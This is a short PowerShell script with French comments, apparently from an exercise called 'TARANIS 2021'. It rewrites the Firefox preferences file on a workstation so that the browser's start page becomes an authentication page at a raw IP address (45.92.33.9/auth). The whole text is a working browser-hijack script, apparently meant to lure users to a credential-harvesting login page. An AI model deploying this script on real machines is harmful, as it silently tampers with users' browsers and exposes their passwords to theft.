# SGT MAAMMAR - 22/11/2021
# TARANIS 2021
# Changement de la page d'accueil de Firefox sur n'importe quelle station


Set-Location "C:\Users\$env:username\AppData\Roaming\Mozilla\Firefox\Profiles"

$path = Get-ChildItem -Recurse | Where-Object { $_.Name -eq "prefs.js" } | Format-Table -Property FullName -HideTableHeaders | Out-String

$path = $path.ToString().Trim()

Add-Content -Path $path -Value 'user_pref("browser.startup.homepage", "https://45.92.33.9/auth");'
